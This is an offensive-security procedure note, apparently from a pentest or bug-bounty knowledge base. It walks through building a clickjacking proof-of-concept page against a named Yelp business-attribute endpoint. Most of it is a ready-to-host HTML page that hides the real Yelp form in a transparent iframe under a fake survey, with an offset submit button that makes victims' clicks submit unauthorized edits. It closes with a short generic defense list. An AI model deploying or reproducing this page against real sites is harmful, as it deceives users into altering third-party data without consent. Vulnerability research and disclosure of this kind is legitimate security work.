---
tags:
  - clickjacking
  - ui-redressing
  - poc
  - html
type: procedure
tools:
  - '[[tools/Bootstrap]]'
  - '[[tools/jQuery]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:04.374Z'
sub_techniques: []
id: b327e055-f7d6-47b9-af2b-1acf17b5f207
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Proof-of-Concept-Malicious-Page-for-ClickJacking

## Summary

This procedure constructs a malicious HTML page that embeds the vulnerable Yelp endpoint in a transparent iframe, overlaying fake form elements to simulate a survey and capture clicks for unauthorized submissions.

## Description

Targeting Yelp's editable business attributes, this procedure uses HTML, CSS, and JavaScript to create a deceptive page. The iframe is hidden with opacity: 0 and absolute positioning, while visible fake inputs (e.g., for name, location, website) and a submit button are aligned to interact with the hidden form. Bootstrap styles the fake UI for legitimacy, and jQuery handles any dynamic elements. Prerequisites: Web hosting for the POC and confirmed vulnerable endpoint. Outcomes: A deployable page that tricks users into form submissions.

## Requirements

1. Bootstrap CSS (version 3.3.7) and jQuery (version 3.2.1) libraries
2. Text editor for HTML/JS creation
3. Web server to host the POC page

## Defense

Defensive measures and detection strategies:

- Use Content-Security-Policy (CSP) to restrict iframe sources
- Scan for suspicious external iframes in client-side code
- Implement multi-factor authentication for sensitive edits

## Objectives

1. Embed and hide the Yelp editing page in an iframe
2. Overlay convincing fake UI elements
3. Ensure clicks on fake elements trigger real form actions

## Instructions

### Step 1: Set Up HTML Structure with Iframe

**Context**: Create the base HTML embedding the vulnerable endpoint.

```html
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
<div class="container">
  <h2>Fake Survey</h2>
  <form>
    <input type="text" placeholder="Restaurant Name" class="form-control">
    <input type="text" placeholder="Location" class="form-control">
    <input type="text" placeholder="Website" class="form-control">
    <button type="submit" class="btn btn-primary" style="margin-top: 1311px;">Submit</button>
  </form>
</div>
<iframe src="https://www.yelp.com/biz_attribute?biz_id=RIyHYSf3lyJcFb4El9T4tQ" style="opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%;"></iframe>
</body>
</html>
```

> The iframe is hidden; fake form mimics the real one.

### Step 2: Align and Test Overlay

**Context**: Position elements to ensure submit aligns with iframe's button.

Adjust CSS for alignment and test in browser.

> Expected output: Clicking fake submit modifies the embedded form (verify by making visible temporarily).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Bootstrap]]
- [[tools/jQuery]]

## Tags

- clickjacking
- poc
- bootstrap
- jquery
